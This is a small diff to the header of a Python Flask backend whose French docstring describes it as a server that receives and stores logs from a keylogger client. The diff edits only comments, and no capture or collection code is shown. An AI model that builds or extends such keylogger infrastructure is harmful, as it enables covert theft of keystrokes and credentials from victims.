@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
 SERVEUR - API Backend
-Reçoit les logs du keylogger et les stocke
+Reçoit les logs du keylogger client et les stocke
 Lance avec: python3 web.py
-Port: 5000
+Port: 5000 # à modifier au choix
 """
 
 from flask import Flask, request, jsonify
